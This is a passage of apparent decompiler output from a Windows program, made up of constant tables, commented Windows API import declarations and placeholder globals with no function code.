  -1234763899,
  1670472547,
  1556542015,
  1670472547,
  1556542015,
  34079234,
  302254608,
  34079234,
  302254608,
  -1433228630,
  -1823918023,
  -1433228630,
  -1823918023,
  1910075761,
  -555571025,
  1910075761,
  -555571025,
  -939013944,
  -963784946,
  -939013944,
  -963784946,
  425990425,
  -785220152,
  425990425,
  -785220152,
  1228491081,
  999452786,
  1228491081,
  999452786,
  -649864743,
  1605343878,
  -649864743,
  1605343878,
  -219155726,
  838409667,
  -219155726,
  838409667,
  -475274269,
  -1462024117,
  -475274269,
  -1462024117,
  1534155611,
  -1179243806,
  1534155611,
  -1179243806,
  -2011527032,
  -1139961292,
  -2011527032,
  -1139961292,
  -1705862502,
  1042925732,
  -1705862502,
  1042925732,
  647505446,
  189578797,
  647505446,
  189578797,
  851980850,
  -1083901299,
  851980850,
  -1083901299,
  -1325748048,
  1501383401,
  -1325748048,
  1501383401,
  -377230871,
  -221287909,
  -377230871,
  -221287909,
  255594255,
  1998467960,
  255594255,
  1998467960,
  -713828907,
  867673830,
  -713828907,
  867673830,
  -2143649664,
  -199378316,
  -2143649664,
  -199378316,
  -1094533442,
  660700313,
  -1094533442,
  660700313,
  -854340147,
  -343417306,
  -854340147,
  -343417306,
  886060084,
  -1989614403,
  886060084,
  -1989614403,
  1211975752,
  848328058,
  1211975752,
  848328058,
  -2359297,
  1424172203,
  -2359297,
  1424172203,
  2062908026,
  -1913352201,
  2062908026,
  -1913352201,
  -1871015792,
  1681779444,
  -1871015792,
  1681779444,
  1600216927,
  -1648476478,
  1600216927,
  -1648476478,
  545267744,
  1027645469,
  545267744,
  1027645469,
  1757243496,
  265344359,
  1757243496,
  265344359,
  443030042,
  -902532400,
  443030042,
  -902532400,
  -1367167314,
  -1220465639,
  -1367167314,
  -1220465639,
  -1259686732,
  2104843977,
  -1259686732,
  2104843977,
  1414354004,
  -827844198,
  1414354004,
  -827844198,
  -1820945517,
  2134631916,
  -1820945517,
  2134631916,
  579346978,
  793029133,
  579346978,
  793029133,
  1686987876,
  1674111239,
  1686987876,
  1674111239,
  -236719631,
  721359579,
  -236719631,
  721359579,
  1943106419,
  -857300289,
  1943106419,
  -857300289,
  306713106,
  -2111546736,
  306713106,
  -2111546736,
  1075658816,
  2055232826,
  1075658816,
  2055232826,
  136316936,
  1209018432,
  136316936,
  1209018432,
  -1020542013,
  -1784944554,
  -1020542013,
  -1784944554,
  -325587732,
  -540705997,
  -325587732,
  -540705997,
  -615785509,
  1303089302,
  -615785509,
  1303089302,
  -1581342303,
  -1067507871,
  -1581342303,
  -1067507871,
  -1928426099,
  -1861778660,
  -1928426099,
  -1861778660,
  1039416637,
  -931477003,
  1039416637,
  -931477003
}; // weak
int dword_4D7860[512] =
{
  -820260913,
  -108800970,
  -820260913,
  -108800970,
  732703531,
  1851164485,
  732703531,
  1851164485,
  1992652406,
  -504581225,
  1992652406,
  -504581225,
  -2110619006,
  -434524060,
  -2110619006,
  -434524060,
  -696265002,
  682732030,
  -696265002,
  682732030,
  460069659,
  -1019840552,
  460069659,
  -1019840552,
  -1242647115,
  1953979329,
  -1242647115,
  1953979329,
  -1350127697,
  -1102894831,
  -1350127697,
  -1102894831,
  1790274154,
  500490103,
  1790274154,
  500490103,
  1348292688,
  -358609478,
  1348292688,
  -358609478,
  1158235461,
  1468681234,
  1158235461,
  1468681234,
  -202640397,
  955979979,
  -202640397,
  955979979,
  817901616,
  -1386155875,
  817901616,
  -1386155875,
  -274993169,
  -993823701,
  -274993169,
  -993823701,
  1073495871,
  -629226523,
  1073495871,
  -629226523,
  1430869333,
  -945152878,
  1430869333,
  -945152878,
  -1565351262,
  -614920071,
  -1565351262,
  -614920071,
  -359666966,
  -372677373,
  -359666966,
  -372677373,
  1703503205,
  1791683599,
  1703503205,
  1791683599,
  -1160594758,
  57239737,
  -1160594758,
  57239737,
  800861999,
  1247712101,
  800861999,
  1247712101,
  -1071136576,
  -1902254258,
  -1071136576,
  -1902254258,
  -564142370,
  1621197246,
  -564142370,
  1621197246,
  477109276,
  -63410976,
  477109276,
  -63410976,
  -36438531,
  1189555899,
  -36438531,
  1189555899,
  1294552397,
  530211922,
  1294552397,
  530211922,
  -1837985134,
  1983504612,
  -1837985134,
  1983504612,
  1976137077,
  -85279601,
  1976137077,
  -85279601,
  102237702,
  906763824,
  102237702,
  906763824,
  -1978496374,
  -1375102940,
  -1978496374,
  -1375102940,
  -1292717390,
  1266237689,
  -1292717390,
  1266237689,
  -423631130,
  -2049877661,
  -423631130,
  -2049877661,
  238554638,
  2115778160,
  238554638,
  2115778160,
  528228127,
  -415341576,
  528228127,
  -415341576,
  1653957218,
  1438971703,
  1653957218,
  1438971703,
  -730344236,
  984982510,
  -730344236,
  984982510,
  -1466259288,
  -2125647319,
  -1466259288,
  -2125647319,
  -1771923818,
  1379005636,
  -1771923818,
  1379005636,
  -104596999,
  1659845275,
  -104596999,
  1659845275,
  -986462779,
  -1550322074,
  -986462779,
  -1550322074,
  630465829,
  273330485,
  630465829,
  273330485,
  1501124953,
  -1414389518,
  1501124953,
  -1414389518,
  -2077588348,
  -803885484,
  -2077588348,
  -803885484,
  1926591090,
  -974870601,
  1926591090,
  -974870601,
  971258169,
  -328016427,
  971258169,
  -328016427,
  1278037068,
  379085146,
  1278037068,
  379085146,
  1583701598,
  -1799603254,
  1583701598,
  -1799603254,
  2029877368,
  -1611627033,
  2029877368,
  -1611627033,
  954218552,
  -445589283,
  954218552,
  -445589283,
  -1945465716,
  -1744468460,
  -1945465716,
  -1744468460,
  -781987375,
  398439110,
  -781987375,
  398439110,
  -1515280987,
  -464057535,
  -1515280987,
  -464057535,
  -491789598,
  -1579594429,
  -491789598,
  -1579594429,
  1637441889,
  1321400367,
  1637441889,
  1321400367,
  -1275677773,
  1115375089,
  -1275677773,
  1115375089,
  562307361,
  876782869,
  562307361,
  876782869,
  -1672831844,
  136697492,
  -1672831844,
  136697492,
  511188510,
  -298031376,
  511188510,
  -298031376,
  1125204803,
  1636192802,
  1125204803,
  1636192802,
  -952383545,
  -1315701642,
  -952383545,
  -1315701642,
  -52953860,
  1340418995,
  -52953860,
  1340418995,
  68158468,
  604509216,
  68158468,
  604509216,
  1364808017,
  -475920206,
  1364808017,
  -475920206,
  -1721853543,
  623888316,
  -1721853543,
  623888316,
  1839820141,
  584762447,
  1839820141,
  584762447,
  221515021,
  1696217448,
  221515021,
  1696217448,
  -87033094,
  2045326723,
  -87033094,
  2045326723,
  -547627041,
  1772324022,
  -547627041,
  1772324022,
  2128969342,
  -1443062825,
  2128969342,
  -1443062825,
  613426212,
  424195133,
  613426212,
  424195133,
  1005337403,
  -25765947,
  1005337403,
  -25765947,
  -1416189013,
  -1706345167,
  -1416189013,
  -1706345167,
  -836776242,
  -259927746,
  -836776242,
  -259927746,
  289673489,
  -1725803128,
  289673489,
  -1725803128,
  -1895395441,
  -2096920308,
  -1895395441,
  -2096920308,
  1311067726,
  77359946,
  1311067726,
  77359946,
  -1209616457,
  1718833617,
  -1209616457,
  1718833617,
  -343151637,
  -523542517,
  -343151637,
  -523542517,
  1022377020,
  -1049047811,
  1022377020,
  -1049047811,
  -2126610047,
  -48251012,
  -2126610047,
  -48251012,
  -1804954476,
  1077280468,
  -1804954476,
  1077280468,
  -134481929,
  485690603,
  -134481929,
  485690603,
  -1176585799,
  409954209,
  -1176585799,
  409954209,
  323752723,
  -1960419432,
  323752723,
  -1960419432,
  749743148,
  1364761725,
  749743148,
  1364761725,
  -747908141,
  96188630,
  -747908141,
  96188630,
  -407115801,
  -1932305301,
  -407115801,
  -1932305301,
  1856335470,
  970771287,
  1856335470,
  970771287,
  -1002978108,
  -1433013394,
  -1002978108,
  -1433013394,
  51118851,
  453381912,
  51118851,
  453381912,
  1447384662,
  -592702582,
  1447384662,
  -592702582,
  1141720132,
  1585989914,
  1141720132,
  1585989914,
  2145484671,
  -1593925921,
  2145484671,
  -1593925921,
  -1449219671,
  -2008074463,
  -1449219671,
  -2008074463,
  715663914,
  1733591629,
  715663914,
  1733591629,
  -1143555141,
  174812593,
  -1143555141,
  174812593,
  -1054621247,
  -2019564986,
  -1054621247,
  -2019564986,
  1397838675,
  -240778590,
  1397838675,
  -240778590,
  -598221604,
  1923451822,
  -598221604,
  1923451822,
  187435787,
  1393960792,
  187435787,
  1393960792,
  -1655792227,
  19387292,
  -1655792227,
  19387292,
  1823304812,
  735625543,
  1823304812,
  735625543,
  834941233,
  -1537018475,
  834941233,
  -1537018475,
  1959621748,
  -202851961,
  1959621748,
  -202851961,
  -150997258,
  368118243,
  -150997258,
  368118243,
  1174750790,
  1284260618,
  1174750790,
  1284260618,
  -1400197972,
  -1522194935,
  -1400197972,
  -1522194935,
  -1994487415,
  -1257269444,
  -1994487415,
  -1257269444,
  340792340,
  -1272429408,
  340792340,
  -1272429408,
  -509353503,
  -1159773605,
  -509353503,
  -1159773605,
  374871574,
  -1507045712,
  374871574,
  -1507045712,
  988297786,
  -143338803,
  988297786,
  -143338803,
  1773758825,
  114479215,
  1773758825,
  114479215,
  153356553,
  1091710280,
  153356553,
  1091710280,
  1893560432,
  -673141337,
  1893560432,
  -673141337,
  -1226656074,
  1869698265,
  -1226656074,
  1869698265,
  -798502704,
  515749838,
  -798502704,
  515749838,
  -309072403,
  -691569093,
  -309072403,
  -691569093,
  -870855476,
  -494544082,
  -870855476,
  -494544082,
  1108689474,
  1753503530,
  1108689474,
  1753503530,
  -1738893160,
  741196468,
  -1738893160,
  741196468,
  -1532320604,
  -313192887,
  -1532320604,
  -313192887,
  681584680,
  1968212061,
  681584680,
  1968212061,
  1550670940,
  -2034748966,
  1550670940,
  -2034748966,
  -121112328,
  1810710419,
  -121112328,
  1810710419,
  -2044557690,
  -1039031228,
  -2044557690,
  -1039031228,
  -389668072,
  1325512839,
  -170744266,
  1385262969,
  -1902396320,
  897256611,
  -1026039779,
  1476283182
}; // weak
// extern SC_HANDLE (__stdcall *OpenServiceA)(SC_HANDLE hSCManager, LPCSTR lpServiceName, DWORD dwDesiredAccess);
// extern BOOL (__stdcall *CryptDecrypt)(HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Final, DWORD dwFlags, BYTE *pbData, DWORD *pdwDataLen);
// extern BOOL (__stdcall *CryptCreateHash)(HCRYPTPROV hProv, ALG_ID Algid, HCRYPTKEY hKey, DWORD dwFlags, HCRYPTHASH *phHash);
// extern BOOL (__stdcall *CryptSetHashParam)(HCRYPTHASH hHash, DWORD dwParam, const BYTE *pbData, DWORD dwFlags);
// extern BOOL (__stdcall *CryptSignHashW)(HCRYPTHASH hHash, DWORD dwKeySpec, LPCWSTR szDescription, DWORD dwFlags, BYTE *pbSignature, DWORD *pdwSigLen);
// extern BOOL (__stdcall *CryptDestroyHash)(HCRYPTHASH hHash);
// extern BOOL (__stdcall *CryptExportKey)(HCRYPTKEY hKey, HCRYPTKEY hExpKey, DWORD dwBlobType, DWORD dwFlags, BYTE *pbData, DWORD *pdwDataLen);
// extern BOOL (__stdcall *CryptGetUserKey)(HCRYPTPROV hProv, DWORD dwKeySpec, HCRYPTKEY *phUserKey);
// extern BOOL (__stdcall *CryptGetProvParam)(HCRYPTPROV hProv, DWORD dwParam, BYTE *pbData, DWORD *pdwDataLen, DWORD dwFlags);
// extern BOOL (__stdcall *CryptDestroyKey)(HCRYPTKEY hKey);
// extern BOOL (__stdcall *CryptEnumProvidersW)(DWORD dwIndex, DWORD *pdwReserved, DWORD dwFlags, DWORD *pdwProvType, LPWSTR szProvName, DWORD *pcbProvName);
// extern BOOL (__stdcall *CryptAcquireContextW)(HCRYPTPROV *phProv, LPCWSTR szContainer, LPCWSTR szProvider, DWORD dwProvType, DWORD dwFlags);
// extern BOOL (__stdcall *CryptGenRandom)(HCRYPTPROV hProv, DWORD dwLen, BYTE *pbBuffer);
// extern BOOL (__stdcall *CryptReleaseContext)(HCRYPTPROV hProv, DWORD dwFlags);
// extern HANDLE (__stdcall *RegisterEventSourceW)(LPCWSTR lpUNCServerName, LPCWSTR lpSourceName);
// extern BOOL (__stdcall *ReportEventW)(HANDLE hEventLog, WORD wType, WORD wCategory, DWORD dwEventID, PSID lpUserSid, WORD wNumStrings, DWORD dwDataSize, LPCWSTR *lpStrings, LPVOID lpRawData);
// extern BOOL (__stdcall *DeregisterEventSource)(HANDLE hEventLog);
// extern BOOL (__stdcall *CloseServiceHandle)(SC_HANDLE hSCObject);
// extern BOOL (__stdcall *StartServiceCtrlDispatcherA)(const SERVICE_TABLE_ENTRYA *lpServiceStartTable);
// extern BOOL (__stdcall *DeleteService)(SC_HANDLE hService);
// extern BOOL (__stdcall *SetServiceStatus)(SERVICE_STATUS_HANDLE hServiceStatus, LPSERVICE_STATUS lpServiceStatus);
// extern SC_HANDLE (__stdcall *OpenSCManagerA)(LPCSTR lpMachineName, LPCSTR lpDatabaseName, DWORD dwDesiredAccess);
// extern BOOL (__stdcall *CertCloseStore)(HCERTSTORE hCertStore, DWORD dwFlags);
// extern BOOL (__stdcall *CertFreeCertificateContext)(PCCERT_CONTEXT pCertContext);
// extern PCCERT_CONTEXT (__stdcall *CertEnumCertificatesInStore)(HCERTSTORE hCertStore, PCCERT_CONTEXT pPrevCertContext);
// extern PCCERT_CONTEXT (__stdcall *CertFindCertificateInStore)(HCERTSTORE hCertStore, DWORD dwCertEncodingType, DWORD dwFindFlags, DWORD dwFindType, const void *pvFindPara, PCCERT_CONTEXT pPrevCertContext);
// extern HCERTSTORE (__stdcall *CertOpenStore)(LPCSTR lpszStoreProvider, DWORD dwEncodingType, HCRYPTPROV_LEGACY hCryptProv, DWORD dwFlags, const void *pvPara);
// extern BOOL (__stdcall *CertGetCertificateContextProperty)(PCCERT_CONTEXT pCertContext, DWORD dwPropId, void *pvData, DWORD *pcbData);
// extern PCCERT_CONTEXT (__stdcall *CertDuplicateCertificateContext)(PCCERT_CONTEXT pCertContext);
// extern DWORD (__stdcall *GetCurrentProcessId)();
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern BOOL (__stdcall *InitializeCriticalSectionAndSpinCount)(LPCRITICAL_SECTION lpCriticalSection, DWORD dwSpinCount);
// extern void (__stdcall *EnterCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern void (__stdcall *LeaveCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern void (__stdcall *DeleteCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern LONG (__stdcall *InterlockedCompareExchange)(volatile LONG *Destination, LONG Exchange, LONG Comperand);
// extern DWORD (__stdcall *TlsAlloc)();
// extern LPVOID (__stdcall *TlsGetValue)(DWORD dwTlsIndex);
// extern BOOL (__stdcall *TlsSetValue)(DWORD dwTlsIndex, LPVOID lpTlsValue);
// extern BOOL (__stdcall *TlsFree)(DWORD dwTlsIndex);
// extern LONG (__stdcall *InterlockedExchangeAdd)(volatile LONG *Addend, LONG Value);
// extern HMODULE (__stdcall *GetModuleHandleW)(LPCWSTR lpModuleName);
// extern DWORD (__stdcall *GetVersion)();
// extern int (__stdcall *MultiByteToWideChar)(UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
// extern BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// extern DWORD (__stdcall *GetFileType)(HANDLE hFile);
// extern HANDLE (__stdcall *GetStdHandle)(DWORD nStdHandle);
// extern void (__stdcall *GetSystemTimeAsFileTime)(LPFILETIME lpSystemTimeAsFileTime);
// extern void (__stdcall *DeleteFiber)(LPVOID lpFiber);
// extern DWORD (__stdcall *GetTickCount)();
// extern BOOL (__stdcall *QueryPerformanceCounter)(LARGE_INTEGER *lpPerformanceCount);
// extern void (__stdcall *GlobalMemoryStatus)(LPMEMORYSTATUS lpBuffer);
// extern int (__stdcall *WideCharToMultiByte)(UINT CodePage, DWORD dwFlags, LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar);
// extern BOOL (__stdcall *ConvertFiberToThread)();
// extern BOOL (__stdcall *GetConsoleMode)(HANDLE hConsoleHandle, LPDWORD lpMode);
// extern BOOL (__stdcall *SetConsoleMode)(HANDLE hConsoleHandle, DWORD dwMode);
// extern BOOL (__stdcall *ReadConsoleA)(HANDLE hConsoleInput, LPVOID lpBuffer, DWORD nNumberOfCharsToRead, LPDWORD lpNumberOfCharsRead, PCONSOLE_READCONSOLE_CONTROL pInputControl);
// extern BOOL (__stdcall *ReadConsoleW)(HANDLE hConsoleInput, LPVOID lpBuffer, DWORD nNumberOfCharsToRead, LPDWORD lpNumberOfCharsRead, PCONSOLE_READCONSOLE_CONTROL pInputControl);
// extern DWORD (__stdcall *GetEnvironmentVariableW)(LPCWSTR lpName, LPWSTR lpBuffer, DWORD nSize);
// extern HMODULE (__stdcall *LoadLibraryW)(LPCWSTR lpLibFileName);
// extern DWORD (__stdcall *GetLastError)();
// extern LPTOP_LEVEL_EXCEPTION_FILTER (__stdcall *SetUnhandledExceptionFilter)(LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter);
// extern BOOL (__stdcall *FreeLibrary)(HMODULE hLibModule);
// extern BOOL (__stdcall *FindNextFileA)(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData);
// extern BOOL (__stdcall *FindClose)(HANDLE hFindFile);
// extern DWORD (__stdcall *GetLogicalDriveStringsA)(DWORD nBufferLength, LPSTR lpBuffer);
// extern HANDLE (__stdcall *FindFirstFileA)(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData);
// extern LPSTR (__stdcall *lstrcatA)(LPSTR lpString1, LPCSTR lpString2);
// extern DWORD (__stdcall *GetFileAttributesA)(LPCSTR lpFileName);
// extern UINT (__stdcall *GetDriveTypeA)(LPCSTR lpRootPathName);
// extern DWORD (__stdcall *GetLogicalDrives)();
// extern LPSTR (__stdcall *lstrcpynA)(LPSTR lpString1, LPCSTR lpString2, int iMaxLength);
// extern HWINSTA (__stdcall *GetProcessWindowStation)();
// extern int (__stdcall *MessageBoxW)(HWND hWnd, LPCWSTR lpText, LPCWSTR lpCaption, UINT uType);
// extern BOOL (__stdcall *GetUserObjectInformationW)(HANDLE hObj, int nIndex, PVOID pvInfo, DWORD nLength, LPDWORD lpnLengthNeeded);
// extern int (__stdcall *closesocket)(SOCKET s);
// extern int (__stdcall *recv)(SOCKET s, char *buf, int len, int flags);
// extern void (__stdcall *WSASetLastError)(int iError);
// extern int (__stdcall *send)(SOCKET s, const char *buf, int len, int flags);
// extern int (__stdcall *WSAGetLastError)();
// extern int (__stdcall *WSACleanup)();
_UNKNOWN unk_4F02AC; // weak
_UNKNOWN unk_4F02E0; // weak
_UNKNOWN unk_4F0314; // weak
_UNKNOWN unk_4F0348; // weak
_UNKNOWN unk_4F037C; // weak
_UNKNOWN unk_4F03B0; // weak
_UNKNOWN unk_4F03E4; // weak
_UNKNOWN unk_4F0418; // weak
_UNKNOWN unk_4F044C; // weak
_UNKNOWN unk_4F0480; // weak
_UNKNOWN unk_4F04B4; // weak
_UNKNOWN unk_4F04E8; // weak
_UNKNOWN unk_4F051C; // weak
_UNKNOWN unk_4F0550; // weak
_UNKNOWN unk_4F0584; // weak
_UNKNOWN unk_4F05B8; // weak
_UNKNOWN unk_4F05EC; // weak
_UNKNOWN unk_4F0620; // weak
_UNKNOWN unk_4F0654; // weak
_UNKNOWN unk_4F0688; // weak
_UNKNOWN unk_4F06BC; // weak
_UNKNOWN unk_4F06F0; // weak
_UNKNOWN unk_4F0724; // weak
_UNKNOWN unk_4F0758; // weak
_UNKNOWN unk_4F078C; // weak
_UNKNOWN unk_4F07C0; // weak
_UNKNOWN unk_4F07F4; // weak
_UNKNOWN unk_4F0828; // weak
_UNKNOWN unk_4F085C; // weak
_UNKNOWN unk_4F0890; // weak
_UNKNOWN unk_4F08C4; // weak
_UNKNOWN unk_4F08F8; // weak
_UNKNOWN unk_4F092C; // weak
_UNKNOWN unk_4F0960; // weak
_UNKNOWN unk_4F0994; // weak
_UNKNOWN unk_4F09C8; // weak
_UNKNOWN unk_4F09FC; // weak
_UNKNOWN unk_4F0A30; // weak
_UNKNOWN unk_4F0A64; // weak
_UNKNOWN unk_4F0A98; // weak
_UNKNOWN unk_4F0ACC; // weak
_UNKNOWN unk_4F0B00; // weak
_UNKNOWN unk_4F0B34; // weak
_UNKNOWN unk_4F0B68; // weak
_UNKNOWN unk_4F0B9C; // weak
_UNKNOWN unk_4F0BD0; // weak
_UNKNOWN unk_4F0C04; // weak
_UNKNOWN unk_4F0C38; // weak
_UNKNOWN unk_4F0C6C; // weak
_UNKNOWN unk_4F0CA0; // weak
_UNKNOWN unk_4F0CD4; // weak
_UNKNOWN unk_4F0D08; // weak
_UNKNOWN unk_4F0D3C; // weak
_UNKNOWN unk_4F0D70; // weak
_UNKNOWN unk_4F0DA4; // weak
_UNKNOWN unk_4F0DD8; // weak
_UNKNOWN unk_4F0E0C; // weak
_UNKNOWN unk_4F0E40; // weak
_UNKNOWN unk_4F0E74; // weak
_UNKNOWN unk_4F0EA8; // weak
_UNKNOWN unk_4F0EDC; // weak
_UNKNOWN unk_4F0F10; // weak
_UNKNOWN unk_4F0F44; // weak
_UNKNOWN unk_4F0F78; // weak
_UNKNOWN unk_4F0FAC; // weak
_UNKNOWN unk_4F0FE0; // weak
_UNKNOWN unk_4F1014; // weak
_UNKNOWN unk_4F1048; // weak
_UNKNOWN unk_4F107C; // weak
_UNKNOWN unk_4F10B0; // weak
char byte_4F1291[3] = { '\0', '\0', '\0' }; // weak
_UNKNOWN unk_4F12BC; // weak
_UNKNOWN unk_4F1934; // weak
int dword_4F193C = -1504093786; // weak
const char word_4F1980[] = { ':', '\0' }; // idb
void *off_4F19FC = &unk_4F19F8; // weak
char byte_4F1A10[256] =
{
  '\0',
  '\x01',
  '\x02',
  '\x02',
  '\x03',
  '\x03',
  '\x03',
  '\x03',
  '\x04',
  '\x04',
  '\x04',
  '\x04',
  '\x04',
  '\x04',
  '\x04',
  '\x04',
  '\x05',
  '\x05',
  '\x05',
  '\x05',
  '\x05',
  '\x05',
  '\x05',
  '\x05',
  '\x05',
  '\x05',
  '\x05',
  '\x05',
  '\x05',
  '\x05',
  '\x05',
  '\x05',
  '\x06',
  '\x06',
  '\x06',
  '\x06',
  '\x06',
  '\x06',
  '\x06',
  '\x06',
  '\x06',
  '\x06',
  '\x06',
  '\x06',
  '\x06',
  '\x06',
  '\x06',
  '\x06',
  '\x06',
  '\x06',
  '\x06',
  '\x06',
  '\x06',
  '\x06',
  '\x06',
  '\x06',
  '\x06',
  '\x06',
  '\x06',
  '\x06',
  '\x06',
  '\x06',
  '\x06',
  '\x06',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\a',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b'
}; // weak
int dword_4F1B24 = 1; // weak
const char a0_0[] = "0"; // idb
_UNKNOWN unk_4F1D08; // weak
_UNKNOWN unk_4F1D6C; // weak
int dword_4F1E10 = 1; // weak
_UNKNOWN unk_4F1EF8; // weak
char byte_4F1F84[] = { '0' }; // weak
_UNKNOWN unk_4F2294; // weak
_UNKNOWN unk_4F2354; // weak
_UNKNOWN unk_4F23C4; // weak
_UNKNOWN unk_4F2614; // weak
_UNKNOWN unk_4F2700; // weak
_UNKNOWN unk_4F271C; // weak
_UNKNOWN unk_4F2854; // weak
_UNKNOWN unk_4F2898; // weak
_UNKNOWN unk_4F28F0; // weak
_UNKNOWN unk_4F2924; // weak
_UNKNOWN unk_4F29CC; // weak
_UNKNOWN unk_4F2A74; // weak
_UNKNOWN unk_4F2AB8; // weak
_UNKNOWN unk_4F2AD4; // weak
_UNKNOWN unk_4F2B54; // weak
_UNKNOWN unk_4F2DF4; // weak
_UNKNOWN unk_4F2E50; // weak
_UNKNOWN unk_4F2E6C; // weak
_UNKNOWN unk_4F2F14; // weak
_UNKNOWN unk_4F2F90; // weak
_UNKNOWN unk_4F3030; // weak
_UNKNOWN unk_4F3064; // weak
_UNKNOWN unk_4F314C; // weak
_UNKNOWN unk_4F3404; // weak
_UNKNOWN unk_4F3434; // weak
_UNKNOWN unk_4F34D4; // weak
_UNKNOWN unk_4F3534; // weak
_UNKNOWN unk_4F3578; // weak
_UNKNOWN unk_4F35D0; // weak
_UNKNOWN unk_4F35EC; // weak
_UNKNOWN unk_4F36BC; // weak
_UNKNOWN unk_4F3728; // weak
_UNKNOWN unk_4F376C; // weak
_UNKNOWN unk_4F3834; // weak
_UNKNOWN unk_4F3878; // weak
_UNKNOWN unk_4F3894; // weak
_UNKNOWN unk_4F39BC; // weak
char *off_4FB9D0[2] = { "UNDEF", "undefined" }; // weak
char *off_4FB9D4 = "undefined"; // weak
int dword_4FB9D8[] = { 0 }; // weak
int dword_501D48[1052] =
{
  364,
  419,
  916,
  948,
  421,
  650,
  653,
  904,
  418,
  958,
  420,
  913,
  423,
  917,
  949,
  425,
  651,
  654,
  905,
  422,
  959,
  424,
  427,
  918,
  950,
  429,
  652,
  655,
  906,
  426,
  960,
  428,
  914,
  1049,
  1047,
  1050,
  1051,
  1053,
  1048,
  1046,
  1052,
  91,
  93,
  92,
  94,
  1056,
  1057,
  14,
  751,
  962,
  757,
  760,
  763,
  964,
  963,
  754,
  961,
  766,
  752,
  966,
  758,
  761,
  764,
  968,
  967,
  755,
  965,
  767,
  753,
  970,
  759,
  762,
  765,
  972,
  971,
  756,
  969,
  768,
  108,
  110,
  109,
  111,
  894,
  13,
  141,
  417,
  1019,
  1018,
  367,
  391,
  31,
  643,
  30,
  656,
  657,
  29,
  32,
  43,
  60,
  62,
  33,
  44,
  61,
  658,
  659,
  63,
  45,
  80,
  380,
  116,
  66,
  113,
  70,
  67,
  297,
  99,
  1036,
  855,
  780,
  781,
  381,
  34,
  35,
  36,
  46,
  1004,
  181,
  183,
  645,
  646,
  773,
  1039,
  1041,
  1038,
  1040,
  1045,
  1043,
  1037,
  1042,
  1044,
  15,
  856,
  3,
  257,
  4,
  114,
  95,
  911,
  388,
  393,
  404,
  57,
  366,
  17,
  178,
  180,
  1005,
  379,
  18,
  749,
  750,
  9,
  168,
  10,
  169,
  147,
  146,
  170,
  148,
  149,
  68,
  144,
  145,
  161,
  69,
  162,
  127,
  935,
  98,
  166,
  37,
  39,
  38,
  40,
  5,
  97,
  915,
  120,
  122,
  121,
  123,
  117,
  19,
  7,
  396,
  8,
  96,
  104,
  119,
  42,
  65,
  115,
  671,
  668,
  669,
  670,
  919,
  912,
  777,
  779,
  776,
  778,
  41,
  64,
  675,
  672,
  673,
  674,
  188,
  167,
  100,
  1006,
  16,
  143,
  1021,
  458,
  0,
  1034,
  1035,
  11,
  378,
  12,
  184,
  185,
  125,
  478,
  289,
  287,
  397,
  288,
  368,
  446,
  363,
  376,
  405,
  910,
  746,
  370,
  484,
  485,
  501,
  177,
  90,
  882,
  87,
  365,
  285,
  921,
  922,
  923,
  924,
  925,
  926,
  927,
  928,
  929,
  930,
  931,
  932,
  933,
  934,
  494,
  860,
  691,
  692,
  697,
  698,
  684,
  685,
  686,
  687,
  693,
  699,
  700,
  702,
  688,
  689,
  690,
  694,
  695,
  696,
  701,
  703,
  881,
  483,
  179,
